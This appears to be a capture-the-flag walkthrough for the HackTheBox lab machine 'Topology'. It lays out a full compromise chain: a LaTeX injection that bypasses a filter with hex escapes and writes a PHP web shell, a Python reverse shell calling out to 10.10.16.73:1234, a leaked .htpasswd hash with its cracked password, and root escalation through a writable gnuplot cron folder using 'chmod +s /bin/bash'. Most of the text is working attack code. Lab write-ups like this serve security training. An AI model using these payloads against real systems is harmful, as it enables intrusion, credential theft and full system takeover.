## Solver
Check page-source found subdomain http://latex.topology.htb/equation.php
Add subdomain to hosts
Known that latext have vulnerable, but its filtered

i check hint on topology official discussion htb :( and found "Checkoway, Shacham and Rescorla"

Check the paper, we can bypass the filter like "i" character with "^^69" (hex of "i")
```
\newwrite\outfile
\openout\outfile=banuaa.php
\wr^^69te\outfile{<?php echo shell_exec("python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.73",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'");?>}
\closeout\outfile
```

Got Web Shell
Reverse Shell python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.73",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
Got Reverse Shell

Check Web root (ls -la ~)
Found /dev/.htpasswd
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

Crack using john the ripper
Found password calculus20

Monitor Process using pspy64
```
Found /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; and gnuplot /opt/gnuplot/loadplot.plt
```

Check /opt/ folder and got writeable folder /opt/gnuplot

So we can create .plt contain system() and move it to /opt/gnuplot/

system("chmod +s /bin/bash")
/bin/bash -p

pwned!